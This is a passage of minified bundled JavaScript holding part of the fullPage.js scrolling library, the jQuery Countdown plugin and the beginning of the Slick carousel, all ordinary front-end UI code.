                    var s = parseInt(i.css("padding-top")) + parseInt(i.css("padding-bottom"));
                    e = Ce - s
                }
                return e
            }

            function Jt(t, e) {
                e ? Yt(Te) : Wt(Te), Te.css(ce(t)), setTimeout((function() {
                    Te.removeClass(l)
                }), 10)
            }

            function Gt(e) {
                if (!e) return [];
                var i = Te.find(v + '[data-anchor="' + e + '"]');
                return i.length || (i = t(v).eq(e - 1)), i
            }

            function te(t, e) {
                var i = Gt(t);
                i.length && (void 0 === e && (e = 0), t === ge || i.hasClass(u) ? ee(i, e) : gt(i, (function() {
                    ee(i, e)
                })))
            }

            function ee(t, e) {
                if (void 0 !== e) {
                    var i = t.find(P),
                        s = function(t, e) {
                            var i = e.find(P),
                                s = i.find(C + '[data-anchor="' + t + '"]');
                            return s.length || (s = i.find(C).eq(t)), s
                        }(e, t);
                    s.length && Ft(i, s)
                }
            }

            function ie(t, e, i, s) {
                var n = "";
                O.anchors.length && !O.lockAnchors && (t ? (void 0 !== i && (n = i), void 0 === e && (e = t), ye = e, se(n + "/" + e)) : void 0 !== t ? (ye = e, se(i)) : se(i)), oe()
            }

            function se(t) {
                if (O.recordHistory) location.hash = t;
                else if (Se || ke) e.history.replaceState(n, n, "#" + t);
                else {
                    var i = e.location.href.split("#")[0];
                    e.location.replace(i + "#" + t)
                }
            }

            function ne(t) {
                var e = t.data("anchor"),
                    i = t.index();
                return void 0 === e && (e = i), e
            }

            function oe() {
                var e = t(g),
                    i = e.find(_),
                    s = ne(e),
                    n = ne(i),
                    o = String(s);
                i.length && (o = o + "-" + n), o = o.replace("/", "-").replace("#", "");
                var r = new RegExp("\\b\\s?" + h + "-[^\\s]+\\b", "g");
                me[0].className = me[0].className.replace(r, ""), me.addClass(h + "-" + o)
            }

            function re(t) {
                var e = [];
                return e.y = void 0 !== t.pageY && (t.pageY || t.pageX) ? t.pageY : t.touches[0].pageY, e.x = void 0 !== t.pageX && (t.pageY || t.pageX) ? t.pageX : t.touches[0].pageX, ke && ht(t) && O.scrollBar && (e.y = t.touches[0].pageY, e.x = t.touches[0].pageX), e
            }

            function ae(t, e) {
                N(0, "internal"), void 0 !== e && (_e = !0), Ft(t.closest(P), t), void 0 !== e && (_e = !1), N(Re.scrollingSpeed, "internal")
            }

            function le(t) {
                var e = s.round(t);
                O.css3 && O.autoScrolling && !O.scrollBar ? Jt("translate3d(0px, -" + e + "px, 0px)", !1) : O.autoScrolling && !O.scrollBar ? Te.css("top", -e) : fe.scrollTop(e)
            }

            function ce(t) {
                return {
                    "-webkit-transform": t,
                    "-moz-transform": t,
                    "-ms-transform": t,
                    transform: t
                }
            }

            function de(e, i, s) {
                "all" !== i ? Me[s][i] = e : t.each(Object.keys(Me[s]), (function(t, i) {
                    Me[s][i] = e
                }))
            }

            function he(t, e, i) {
                O[t] = e, "internal" !== i && (Re[t] = e)
            }

            function ue() {
                return t("html").hasClass(d) ? void pe("error", "Fullpage.js can only be initialized once and you are doing it multiple times!") : (O.continuousVertical && (O.loopTop || O.loopBottom) && (O.continuousVertical = !1, pe("warn", "Option `loopTop/loopBottom` is mutually exclusive with `continuousVertical`; `continuousVertical` disabled")), O.scrollBar && O.scrollOverflow && pe("warn", "Option `scrollBar` is mutually exclusive with `scrollOverflow`. Sections with scrollOverflow might not work well in Firefox"), !O.continuousVertical || !O.scrollBar && O.autoScrolling || (O.continuousVertical = !1, pe("warn", "Scroll bars (`scrollBar:true` or `autoScrolling:false`) are mutually exclusive with `continuousVertical`; `continuousVertical` disabled")), O.scrollOverflow && !O.scrollOverflowHandler && (O.scrollOverflow = !1, pe("error", "The option `scrollOverflow:true` requires the file `scrolloverflow.min.js`. Please include it before fullPage.js.")), t.each(["fadingEffect", "continuousHorizontal", "scrollHorizontally", "interlockedSlides", "resetSliders", "responsiveSlides", "offsetSections", "dragAndMove", "scrollOverflowReset", "parallax"], (function(t, e) {
                    O[e] && pe("warn", "fullpage.js extensions require jquery.fullpage.extensions.min.js file instead of the usual jquery.fullpage.js. Requested: " + e)
                })), void t.each(O.anchors, (function(e, i) {
                    var s = Y.find("[name]").filter((function() {
                            return t(this).attr("name") && t(this).attr("name").toLowerCase() == i.toLowerCase()
                        })),
                        n = Y.find("[id]").filter((function() {
                            return t(this).attr("id") && t(this).attr("id").toLowerCase() == i.toLowerCase()
                        }));
                    (n.length || s.length) && (pe("error", "data-anchor tags can not have the same value as any `id` element on the site (or `name` element for IE)."), n.length && pe("error", '"' + i + '" is is being used by another element `id` property'), s.length && pe("error", '"' + i + '" is is being used by another element `name` property'))
                })))
            }

            function pe(t, e) {
                console && console[t] && console[t]("fullPage: " + e)
            }
            if (t("html").hasClass(d)) ue();
            else {
                var fe = t("html, body"),
                    me = t("body"),
                    ve = t.fn.fullpage;
                O = t.extend({
                    menu: !1,
                    anchors: [],
                    lockAnchors: !1,
                    navigation: !1,
                    navigationPosition: "right",
                    navigationTooltips: [],
                    showActiveTooltip: !1,
                    slidesNavigation: !1,
                    slidesNavPosition: "bottom",
                    scrollBar: !1,
                    hybrid: !1,
                    css3: !0,
                    scrollingSpeed: 700,
                    autoScrolling: !0,
                    fitToSection: !0,
                    fitToSectionDelay: 1e3,
                    easing: "easeInOutCubic",
                    easingcss3: "ease",
                    loopBottom: !1,
                    loopTop: !1,
                    loopHorizontal: !0,
                    continuousVertical: !1,
                    continuousHorizontal: !1,
                    scrollHorizontally: !1,
                    interlockedSlides: !1,
                    dragAndMove: !1,
                    offsetSections: !1,
                    resetSliders: !1,
                    fadingEffect: !1,
                    normalScrollElements: null,
                    scrollOverflow: !1,
                    scrollOverflowReset: !1,
                    scrollOverflowHandler: t.fn.fp_scrolloverflow ? t.fn.fp_scrolloverflow.iscrollHandler : null,
                    scrollOverflowOptions: null,
                    touchSensitivity: 5,
                    normalScrollElementTouchThreshold: 5,
                    bigSectionsDestination: null,
                    keyboardScrolling: !0,
                    animateAnchor: !0,
                    recordHistory: !0,
                    controlArrows: !0,
                    controlArrowColor: "#fff",
                    verticalCentered: !0,
                    sectionsColor: [],
                    paddingTop: 0,
                    paddingBottom: 0,
                    fixedElements: null,
                    responsive: 0,
                    responsiveWidth: 0,
                    responsiveHeight: 0,
                    responsiveSlides: !1,
                    parallax: !1,
                    parallaxOptions: {
                        type: "reveal",
                        percentage: 62,
                        property: "translate"
                    },
                    sectionSelector: ".section",
                    slideSelector: ".slide",
                    afterLoad: null,
                    onLeave: null,
                    afterRender: null,
                    afterResize: null,
                    afterReBuild: null,
                    afterSlideLoad: null,
                    onSlideLeave: null,
                    afterResponsive: null,
                    lazyLoading: !0
                }, O);
                var ge, ye, be, we, xe = !1,
                    Se = navigator.userAgent.match(/(iPhone|iPod|iPad|Android|playbook|silk|BlackBerry|BB10|Windows Phone|Tizen|Bada|webOS|IEMobile|Opera Mini)/),
                    ke = "ontouchstart" in e || navigator.msMaxTouchPoints > 0 || navigator.maxTouchPoints,
                    Te = t(this),
                    Ce = B.height(),
                    _e = !1,
                    Ee = !0,
                    Pe = !0,
                    Ae = [],
                    Me = {
                        m: {
                            up: !0,
                            down: !0,
                            left: !0,
                            right: !0
                        }
                    };
                Me.k = t.extend(!0, {}, Me.m);
                var $e, Ie, ze, Le, Oe, je, He, De = e.PointerEvent ? {
                        down: "pointerdown",
                        move: "pointermove"
                    } : {
                        down: "MSPointerDown",
                        move: "MSPointerMove"
                    },
                    Fe = {
                        touchmove: "ontouchmove" in e ? "touchmove" : De.move,
                        touchstart: "ontouchstart" in e ? "touchstart" : De.down
                    },
                    Re = t.extend(!0, {}, O);
                ue(), t.extend(t.easing, {
                    easeInOutCubic: function(t, e, i, s, n) {
                        return (e /= n / 2) < 1 ? s / 2 * e * e * e + i : s / 2 * ((e -= 2) * e * e + 2) + i
                    }
                }), t(this).length && (ve.version = "2.9.5", ve.setAutoScrolling = R, ve.setRecordHistory = W, ve.setScrollingSpeed = N, ve.setFitToSection = U, ve.setLockAnchors = function(t) {
                    O.lockAnchors = t
                }, ve.setMouseWheelScrolling = V, ve.setAllowScrolling = Q, ve.setKeyboardScrolling = Z, ve.moveSectionUp = K, ve.moveSectionDown = J, ve.silentMoveTo = G, ve.moveTo = tt, ve.moveSlideRight = et, ve.moveSlideLeft = it, ve.fitToSection = at, ve.reBuild = st, ve.setResponsive = nt, ve.destroy = function(e) {
                    R(!1, "internal"), Q(!1), Z(!1), Te.addClass(c), clearTimeout(Le), clearTimeout(ze), clearTimeout(Ie), clearTimeout(Oe), clearTimeout(je), B.off("scroll", rt).off("hashchange", Et).off("resize", qt), Y.off("click touchstart", x + " a").off("mouseenter", x + " li").off("mouseleave", x + " li").off("click touchstart", L).off("mouseover", O.normalScrollElements).off("mouseout", O.normalScrollElements), t(v).off("click touchstart", j), clearTimeout(Le), clearTimeout(ze), e && function() {
                        le(0), Te.find("img[data-src], source[data-src], audio[data-src], iframe[data-src]").each((function() {
                            wt(t(this), "src")
                        })), Te.find("img[data-srcset]").each((function() {
                            wt(t(this), "srcset")
                        })), t(x + ", " + z + ", " + j).remove(), t(v).css({
                            height: "",
                            "background-color": "",
                            padding: ""
                        }), t(C).css({
                            width: ""
                        }), Te.css({
                            height: "",
                            position: "",
                            "-ms-touch-action": "",
                            "touch-action": ""
                        }), fe.css({
                            overflow: "",
                            height: ""
                        }), t("html").removeClass(d), me.removeClass(a), t.each(me.get(0).className.split(/\s+/), (function(t, e) {
                            0 === e.indexOf(h) && me.removeClass(e)
                        })), t(v + ", " + C).each((function() {
                            O.scrollOverflowHandler && O.scrollOverflowHandler.remove(t(this)), t(this).removeClass($ + " " + u)
                        })), Wt(Te), Te.find(b + ", " + M + ", " + P).each((function() {
                            t(this).replaceWith(this.childNodes)
                        })), Te.css({
                            "-webkit-transition": "none",
                            transition: "none"
                        }), fe.scrollTop(0);
                        var e = [m, T, A];
                        t.each(e, (function(e, i) {
                            t("." + i).removeClass(i)
                        }))
                    }()
                }, ve.shared = {
                    afterRenderActions: ot
                }, O.css3 && (O.css3 = function() {
                    var t, s = i.createElement("p"),
                        o = {
                            webkitTransform: "-webkit-transform",
                            OTransform: "-o-transform",
                            msTransform: "-ms-transform",
                            MozTransform: "-moz-transform",
                            transform: "transform"
                        };
                    for (var r in i.body.insertBefore(s, null), o) s.style[r] !== n && (s.style[r] = "translate3d(1px,1px,1px)", t = e.getComputedStyle(s).getPropertyValue(o[r]));
                    return i.body.removeChild(s), t !== n && t.length > 0 && "none" !== t
                }()), O.scrollBar = O.scrollBar || O.hybrid, function() {
                    var e = Te.find(O.sectionSelector);
                    O.anchors.length || (O.anchors = e.filter("[data-anchor]").map((function() {
                        return t(this).data("anchor").toString()
                    })).get()), O.navigationTooltips.length || (O.navigationTooltips = e.filter("[data-tooltip]").map((function() {
                        return t(this).data("tooltip").toString()
                    })).get())
                }(), Te.css({
                    height: "100%",
                    position: "relative"
                }), Te.addClass(o), t("html").addClass(d), Ce = B.height(), Te.removeClass(c), Te.find(O.sectionSelector).addClass(m), Te.find(O.slideSelector).addClass(T), t(v).each((function(e) {
                    var i = t(this),
                        s = i.find(C),
                        n = s.length;
                    (function(e, i) {
                        i || 0 !== t(g).length || e.addClass(u), we = t(g), e.css("height", Ce + "px"), O.paddingTop && e.css("padding-top", O.paddingTop), O.paddingBottom && e.css("padding-bottom", O.paddingBottom), void 0 !== O.sectionsColor[i] && e.css("background-color", O.sectionsColor[i]), void 0 !== O.anchors[i] && e.attr("data-anchor", O.anchors[i])
                    })(i, e),
                        function(e, i) {
                            void 0 !== O.anchors[i] && e.hasClass(u) && Vt(O.anchors[i], i), O.menu && O.css3 && t(O.menu).closest(r).length && t(O.menu).appendTo(me)
                        }(i, e), n > 0 ? function(e, i, s) {
                        var n = 100 * s,
                            o = 100 / s;
                        i.wrapAll('<div class="' + A + '" />'), i.parent().wrap('<div class="' + E + '" />'), e.find(M).css("width", n + "%"), s > 1 && (O.controlArrows && function(t) {
                            t.find(P).after('<div class="' + D + '"></div><div class="' + X + '"></div>'), "#fff" != O.controlArrowColor && (t.find(q).css("border-color", "transparent transparent transparent " + O.controlArrowColor), t.find(F).css("border-color", "transparent " + O.controlArrowColor + " transparent transparent")), O.loopHorizontal || t.find(F).hide()
                        }(e), O.slidesNavigation && function(t, e) {
                            t.append('<div class="' + I + '"><ul></ul></div>');
                            var i = t.find(z);
                            i.addClass(O.slidesNavPosition);
                            for (var s = 0; s < e; s++) i.find("ul").append('<li><a href="#"><span></span></a></li>');
                            i.css("margin-left", "-" + i.width() / 2 + "px"), i.find("li").first().find("a").addClass(u)
                        }(e, s)), i.each((function(e) {
                            t(this).css("width", o + "%"), O.verticalCentered && Zt(t(this))
                        }));
                        var r = e.find(_);
                        r.length && (0 !== t(g).index(v) || 0 === t(g).index(v) && 0 !== r.index()) ? ae(r, "internal") : i.eq(0).addClass(u)
                    }(i, s, n) : O.verticalCentered && Zt(i)
                })), O.fixedElements && O.css3 && t(O.fixedElements).appendTo(me), O.navigation && function() {
                    me.append('<div id="' + w + '"><ul></ul></div>');
                    var e = t(x);
                    e.addClass((function() {
                        return O.showActiveTooltip ? k + " " + O.navigationPosition : O.navigationPosition
                    }));
                    for (var i = 0; i < t(v).length; i++) {
                        var s = "";
                        O.anchors.length && (s = O.anchors[i]);
                        var n = '<li><a href="#' + s + '"><span></span></a>',
                            o = O.navigationTooltips[i];
                        void 0 !== o && "" !== o && (n += '<div class="' + S + " " + O.navigationPosition + '">' + o + "</div>"), n += "</li>", e.find("ul").append(n)
                    }
                    t(x).css("margin-top", "-" + t(x).height() / 2 + "px"), t(x).find("li").eq(t(g).index(v)).find("a").addClass(u)
                }(), Te.find('iframe[src*="youtube.com/embed/"]').each((function() {
                    ! function(t, e) {
                        var i = t.attr("src");
                        t.attr("src", i + function(t) {
                            return /\?/.test(t) ? "&" : "?"
                        }(i) + e)
                    }(t(this), "enablejsapi=1")
                })), O.scrollOverflow ? $e = O.scrollOverflowHandler.init(O) : ot(), Q(!0), R(O.autoScrolling, "internal"), Bt(), oe(), "complete" === i.readyState && _t(), B.on("load", _t), B.on("scroll", rt).on("hashchange", Et).blur(Ot).resize(qt), Y.keydown(At).keyup($t).on("click touchstart", x + " a", jt).on("click touchstart", L, Ht).on("click", ".fp-tooltip", Mt), t(v).on("click touchstart", j, Lt), O.normalScrollElements && (Y.on("mouseenter touchstart", O.normalScrollElements, (function() {
                    Q(!1)
                })), Y.on("mouseleave touchend", O.normalScrollElements, (function() {
                    Q(!0)
                }))));
                var Xe = !1,
                    qe = 0,
                    Be = 0,
                    Ye = 0,
                    We = 0,
                    Ne = 0,
                    Ue = (new Date).getTime(),
                    Ve = 0,
                    Qe = 0,
                    Ze = Ce
            }
        }
    })),
    function(t) {
        "use strict";
        "function" == typeof define && define.amd ? define(["jquery"], t) : t(jQuery)
    }((function(t) {
        "use strict";

        function e(t) {
            var e = t.toString().replace(/([.?*+^$[\]\\(){}|-])/g, "\\$1");
            return new RegExp(e)
        }

        function i(t) {
            return function(i) {
                var n = i.match(/%(-|!)?[A-Z]{1}(:[^;]+;)?/gi);
                if (n)
                    for (var o = 0, r = n.length; o < r; ++o) {
                        var l = n[o].match(/%(-|!)?([a-zA-Z]{1})(:[^;]+;)?/),
                            c = e(l[0]),
                            d = l[1] || "",
                            h = l[3] || "",
                            u = null;
                        l = l[2], a.hasOwnProperty(l) && (u = a[l], u = Number(t[u])), null !== u && ("!" === d && (u = s(h, u)), "" === d && u < 10 && (u = "0" + u.toString()), i = i.replace(c, u.toString()))
                    }
                return i.replace(/%%/, "%")
            }
        }

        function s(t, e) {
            var i = "s",
                s = "";
            return t && (1 === (t = t.replace(/(:|;|\s)/gi, "").split(/\,/)).length ? i = t[0] : (s = t[0], i = t[1])), Math.abs(e) > 1 ? i : s
        }
        var n = [],
            o = [],
            r = {
                precision: 100,
                elapse: !1,
                defer: !1
            };
        o.push(/^[0-9]*$/.source), o.push(/([0-9]{1,2}\/){2}[0-9]{4}( [0-9]{1,2}(:[0-9]{2}){2})?/.source), o.push(/[0-9]{4}([\/\-][0-9]{1,2}){2}( [0-9]{1,2}(:[0-9]{2}){2})?/.source), o = new RegExp(o.join("|"));
        var a = {
                Y: "years",
                m: "months",
                n: "daysToMonth",
                d: "daysToWeek",
                w: "weeks",
                W: "weeksToMonth",
                H: "hours",
                M: "minutes",
                S: "seconds",
                D: "totalDays",
                I: "totalHours",
                N: "totalMinutes",
                T: "totalSeconds"
            },
            l = function(e, i, s) {
                this.el = e, this.$el = t(e), this.interval = null, this.offset = {}, this.options = t.extend({}, r), this.instanceNumber = n.length, n.push(this), this.$el.data("countdown-instance", this.instanceNumber), s && ("function" == typeof s ? (this.$el.on("update.countdown", s), this.$el.on("stoped.countdown", s), this.$el.on("finish.countdown", s)) : this.options = t.extend({}, r, s)), this.setFinalDate(i), !1 === this.options.defer && this.start()
            };
        t.extend(l.prototype, {
            start: function() {
                null !== this.interval && clearInterval(this.interval);
                var t = this;
                this.update(), this.interval = setInterval((function() {
                    t.update.call(t)
                }), this.options.precision)
            },
            stop: function() {
                clearInterval(this.interval), this.interval = null, this.dispatchEvent("stoped")
            },
            toggle: function() {
                this.interval ? this.stop() : this.start()
            },
            pause: function() {
                this.stop()
            },
            resume: function() {
                this.start()
            },
            remove: function() {
                this.stop.call(this), n[this.instanceNumber] = null, delete this.$el.data().countdownInstance
            },
            setFinalDate: function(t) {
                this.finalDate = function(t) {
                    if (t instanceof Date) return t;
                    if (String(t).match(o)) return String(t).match(/^[0-9]*$/) && (t = Number(t)), String(t).match(/\-/) && (t = String(t).replace(/\-/g, "/")), new Date(t);
                    throw new Error("Couldn't cast `" + t + "` to a date object.")
                }(t)
            },
            update: function() {
                if (0 !== this.$el.closest("html").length) {
                    var e, i = void 0 !== t._data(this.el, "events"),
                        s = new Date;
                    e = this.finalDate.getTime() - s.getTime(), e = Math.ceil(e / 1e3), e = !this.options.elapse && e < 0 ? 0 : Math.abs(e), this.totalSecsLeft !== e && i && (this.totalSecsLeft = e, this.elapsed = s >= this.finalDate, this.offset = {
                        seconds: this.totalSecsLeft % 60,
                        minutes: Math.floor(this.totalSecsLeft / 60) % 60,
                        hours: Math.floor(this.totalSecsLeft / 60 / 60) % 24,
                        days: Math.floor(this.totalSecsLeft / 60 / 60 / 24) % 7,
                        daysToWeek: Math.floor(this.totalSecsLeft / 60 / 60 / 24) % 7,
                        daysToMonth: Math.floor(this.totalSecsLeft / 60 / 60 / 24 % 30.4368),
                        weeks: Math.floor(this.totalSecsLeft / 60 / 60 / 24 / 7),
                        weeksToMonth: Math.floor(this.totalSecsLeft / 60 / 60 / 24 / 7) % 4,
                        months: Math.floor(this.totalSecsLeft / 60 / 60 / 24 / 30.4368),
                        years: Math.abs(this.finalDate.getFullYear() - s.getFullYear()),
                        totalDays: Math.floor(this.totalSecsLeft / 60 / 60 / 24),
                        totalHours: Math.floor(this.totalSecsLeft / 60 / 60),
                        totalMinutes: Math.floor(this.totalSecsLeft / 60),
                        totalSeconds: this.totalSecsLeft
                    }, this.options.elapse || 0 !== this.totalSecsLeft ? this.dispatchEvent("update") : (this.stop(), this.dispatchEvent("finish")))
                } else this.remove()
            },
            dispatchEvent: function(e) {
                var s = t.Event(e + ".countdown");
                s.finalDate = this.finalDate, s.elapsed = this.elapsed, s.offset = t.extend({}, this.offset), s.strftime = i(this.offset), this.$el.trigger(s)
            }
        }), t.fn.countdown = function() {
            var e = Array.prototype.slice.call(arguments, 0);
            return this.each((function() {
                var i = t(this).data("countdown-instance");
                if (void 0 !== i) {
                    var s = n[i],
                        o = e[0];
                    l.prototype.hasOwnProperty(o) ? s[o].apply(s, e.slice(1)) : null === String(o).match(/^[$A-Z_][0-9A-Z_$]*$/i) ? (s.setFinalDate.call(s, o), s.start()) : t.error("Method %s does not exist on jQuery.countdown".replace(/\%s/gi, o))
                } else new l(this, e[0], e[1])
            }))
        }
    })),
    function(t) {
        "use strict";
        "function" == typeof define && define.amd ? define(["jquery"], t) : "undefined" != typeof exports ? module.exports = t(require("jquery")) : t(jQuery)
    }((function(t) {
        "use strict";
        var e = window.Slick || {};
        (e = function() {
            var e = 0;
            return function(i, s) {
                var n, o = this;
                o.defaults = {
                    accessibility: !0,
                    adaptiveHeight: !1,
                    appendArrows: t(i),
                    appendDots: t(i),
                    arrows: !0,
                    asNavFor: null,
                    prevArrow: '<button type="button" data-role="none" class="slick-prev" aria-label="Previous" tabindex="0" role="button">Previous</button>',
                    nextArrow: '<button type="button" data-role="none" class="slick-next" aria-label="Next" tabindex="0" role="button">Next</button>',
                    autoplay: !1,
                    autoplaySpeed: 3e3,
                    centerMode: !1,
                    centerPadding: "50px",
                    cssEase: "ease",
                    customPaging: function(e, i) {
                        return t('<button type="button" data-role="none" role="button" tabindex="0" />').text(i + 1)
                    },
                    dots: !1,
                    dotsClass: "slick-dots",
                    draggable: !0,
                    easing: "linear",
                    edgeFriction: .35,
                    fade: !1,
                    focusOnSelect: !1,
                    infinite: !0,
                    initialSlide: 0,
                    lazyLoad: "ondemand",
                    mobileFirst: !1,
                    pauseOnHover: !0,
                    pauseOnFocus: !0,
                    pauseOnDotsHover: !1,
                    respondTo: "window",
                    responsive: null,
                    rows: 1,
                    rtl: !1,
                    slide: "",
                    slidesPerRow: 1,
                    slidesToShow: 1,
                    slidesToScroll: 1,
                    speed: 500,
                    swipe: !0,
                    swipeToSlide: !1,
                    touchMove: !0,
                    touchThreshold: 5,
                    useCSS: !0,
                    useTransform: !0,
                    variableWidth: !1,
                    vertical: !1,
                    verticalSwiping: !1,
                    waitForAnimate: !0,
                    zIndex: 1e3
                }, o.initials = {
                    animating: !1,
                    dragging: !1,
                    autoPlayTimer: null,
                    currentDirection: 0,
                    currentLeft: null,
                    currentSlide: 0,
                    direction: 1,
                    $dots: null,
                    listWidth: null,
                    listHeight: null,
                    loadIndex: 0,
                    $nextArrow: null,
                    $prevArrow: null,
                    slideCount: null,
                    slideWidth: null,
                    $slideTrack: null,
                    $slides: null,
                    sliding: !1,
                    slideOffset: 0,
                    swipeLeft: null,
                    $list: null,
                    touchObject: {},
                    transformsEnabled: !1,
                    unslicked: !1
                }, t.extend(o, o.initials), o.activeBreakpoint = null, o.animType = null, o.animProp = null, o.breakpoints = [], o.breakpointSettings = [], o.cssTransitions = !1, o.focussed = !1, o.interrupted = !1, o.hidden = "hidden", o.paused = !0, o.positionProp = null, o.respondTo = null, o.rowCount = 1, o.shouldClick = !0, o.$slider = t(i), o.$slidesCache = null, o.transformType = null, o.transitionType = null, o.visibilityChange = "visibilitychange", o.windowWidth = 0, o.windowTimer = null, n = t(i).data("slick") || {}, o.options = t.extend({}, o.defaults, s, n), o.currentSlide = o.options.initialSlide, o.originalSettings = o.options, void 0 !== document.mozHidden ? (o.hidden = "mozHidden", o.visibilityChange = "mozvisibilitychange") : void 0 !== document.webkitHidden && (o.hidden = "webkitHidden", o.visibilityChange = "webkitvisibilitychange"), o.autoPlay = t.proxy(o.autoPlay, o), o.autoPlayClear = t.proxy(o.autoPlayClear, o), o.autoPlayIterator = t.proxy(o.autoPlayIterator, o), o.changeSlide = t.proxy(o.changeSlide, o), o.clickHandler = t.proxy(o.clickHandler, o), o.selectHandler = t.proxy(o.selectHandler, o), o.setPosition = t.proxy(o.setPosition, o), o.swipeHandler = t.proxy(o.swipeHandler, o), o.dragHandler = t.proxy(o.dragHandler, o), o.keyHandler = t.proxy(o.keyHandler, o), o.instanceUid = e++, o.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/, o.registerBreakpoints(), o.init(!0)
            }
        }()).prototype.activateADA = function() {
            this.$slideTrack.find(".slick-active").attr({
                "aria-hidden": "false"
            }).find("a, input, button, select").attr({
                tabindex: "0"
            })
        }, e.prototype.addSlide = e.prototype.slickAdd = function(e, i, s) {
            var n = this;
            if ("boolean" == typeof i) s = i, i = null;
            else if (0 > i || i >= n.slideCount) return !1;
            n.unload(), "number" == typeof i ? 0 === i && 0 === n.$slides.length ? t(e).appendTo(n.$slideTrack) : s ? t(e).insertBefore(n.$slides.eq(i)) : t(e).insertAfter(n.$slides.eq(i)) : !0 === s ? t(e).prependTo(n.$slideTrack) : t(e).appendTo(n.$slideTrack), n.$slides = n.$slideTrack.children(this.options.slide), n.$slideTrack.children(this.options.slide).detach(), n.$slideTrack.append(n.$slides), n.$slides.each((function(e, i) {
                t(i).attr("data-slick-index", e)
            })), n.$slidesCache = n.$slides, n.reinit()
        }, e.prototype.animateHeight = function() {
            var t = this;
            if (1 === t.options.slidesToShow && !0 === t.options.adaptiveHeight && !1 === t.options.vertical) {
                var e = t.$slides.eq(t.currentSlide).outerHeight(!0);
                t.$list.animate({
                    height: e
                }, t.options.speed)
            }
        }, e.prototype.animateSlide = function(e, i) {
            var s = {},
                n = this;
            n.animateHeight(), !0 === n.options.rtl && !1 === n.options.vertical && (e = -e), !1 === n.transformsEnabled ? !1 === n.options.vertical ? n.$slideTrack.animate({
                left: e
            }, n.options.speed, n.options.easing, i) : n.$slideTrack.animate({
                top: e
            }, n.options.speed, n.options.easing, i) : !1 === n.cssTransitions ? (!0 === n.options.rtl && (n.currentLeft = -n.currentLeft), t({
                animStart: n.currentLeft
            }).animate({
                animStart: e
            }, {
                duration: n.options.speed,
                easing: n.options.easing,
                step: function(t) {
                    t = Math.ceil(t), !1 === n.options.vertical ? (s[n.animType] = "translate(" + t + "px, 0px)", n.$slideTrack.css(s)) : (s[n.animType] = "translate(0px," + t + "px)", n.$slideTrack.css(s))
                },
                complete: function() {
                    i && i.call()
                }
            })) : (n.applyTransition(), e = Math.ceil(e), !1 === n.options.vertical ? s[n.animType] = "translate3d(" + e + "px, 0px, 0px)" : s[n.animType] = "translate3d(0px," + e + "px, 0px)", n.$slideTrack.css(s), i && setTimeout((function() {
                n.disableTransition(), i.call()
            }), n.options.speed))
        }, e.prototype.getNavTarget = function() {
            var e = this.options.asNavFor;
            return e && null !== e && (e = t(e).not(this.$slider)), e
        }, e.prototype.asNavFor = function(e) {
            var i = this.getNavTarget();
            null !== i && "object" == typeof i && i.each((function() {
                var i = t(this).slick("getSlick");
                i.unslicked || i.slideHandler(e, !0)
            }))
        }, e.prototype.applyTransition = function(t) {
            var e = this,
                i = {};
            !1 === e.options.fade ? i[e.transitionType] = e.transformType + " " + e.options.speed + "ms " + e.options.cssEase : i[e.transitionType] = "opacity " + e.options.speed + "ms " + e.options.cssEase, !1 === e.options.fade ? e.$slideTrack.css(i) : e.$slides.eq(t).css(i)
        }, e.prototype.autoPlay = function() {
            var t = this;
            t.autoPlayClear(), t.slideCount > t.options.slidesToShow && (t.autoPlayTimer = setInterval(t.autoPlayIterator, t.options.autoplaySpeed))
        }, e.prototype.autoPlayClear = function() {
            this.autoPlayTimer && clearInterval(this.autoPlayTimer)
        }, e.prototype.autoPlayIterator = function() {
            var t = this,
                e = t.currentSlide + t.options.slidesToScroll;
            t.paused || t.interrupted || t.focussed || (!1 === t.options.infinite && (1 === t.direction && t.currentSlide + 1 === t.slideCount - 1 ? t.direction = 0 : 0 === t.direction && (e = t.currentSlide - t.options.slidesToScroll, t.currentSlide - 1 == 0 && (t.direction = 1))), t.slideHandler(e))
        }, e.prototype.buildArrows = function() {
            var e = this;
            !0 === e.options.arrows && (e.$prevArrow = t(e.options.prevArrow).addClass("slick-arrow"), e.$nextArrow = t(e.options.nextArrow).addClass("slick-arrow"), e.slideCount > e.options.slidesToShow ? (e.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), e.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.prependTo(e.options.appendArrows), e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.appendTo(e.options.appendArrows), !0 !== e.options.infinite && e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true")) : e.$prevArrow.add(e.$nextArrow).addClass("slick-hidden").attr({
                "aria-disabled": "true",
                tabindex: "-1"
            }))
        }, e.prototype.buildDots = function() {
            var e, i, s = this;
            if (!0 === s.options.dots && s.slideCount > s.options.slidesToShow) {
                for (s.$slider.addClass("slick-dotted"), i = t("<ul />").addClass(s.options.dotsClass), e = 0; e <= s.getDotCount(); e += 1) i.append(t("<li />").append(s.options.customPaging.call(this, s, e)));
                s.$dots = i.appendTo(s.options.appendDots), s.$dots.find("li").first().addClass("slick-active").attr("aria-hidden", "false")
            }
        }, e.prototype.buildOut = function() {
            var e = this;
            e.$slides = e.$slider.children(e.options.slide + ":not(.slick-cloned)").addClass("slick-slide"), e.slideCount = e.$slides.length, e.$slides.each((function(e, i) {
                t(i).attr("data-slick-index", e).data("originalStyling", t(i).attr("style") || "")
            })), e.$slider.addClass("slick-slider"), e.$slideTrack = 0 === e.slideCount ? t('<div class="slick-track"/>').appendTo(e.$slider) : e.$slides.wrapAll('<div class="slick-track"/>').parent(), e.$list = e.$slideTrack.wrap('<div aria-live="polite" class="slick-list"/>').parent(), e.$slideTrack.css("opacity", 0), (!0 === e.options.centerMode || !0 === e.options.swipeToSlide) && (e.options.slidesToScroll = 1), t("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"), e.setupInfinite(), e.buildArrows(), e.buildDots(), e.updateDots(), e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0), !0 === e.options.draggable && e.$list.addClass("draggable")
        }, e.prototype.buildRows = function() {
            var t, e, i, s, n, o, r, a = this;
            if (s = document.createDocumentFragment(), o = a.$slider.children(), a.options.rows > 1) {
                for (r = a.options.slidesPerRow * a.options.rows, n = Math.ceil(o.length / r), t = 0; n > t; t++) {
                    var l = document.createElement("div");
                    for (e = 0; e < a.options.rows; e++) {
                        var c = document.createElement("div");
                        for (i = 0; i < a.options.slidesPerRow; i++) {
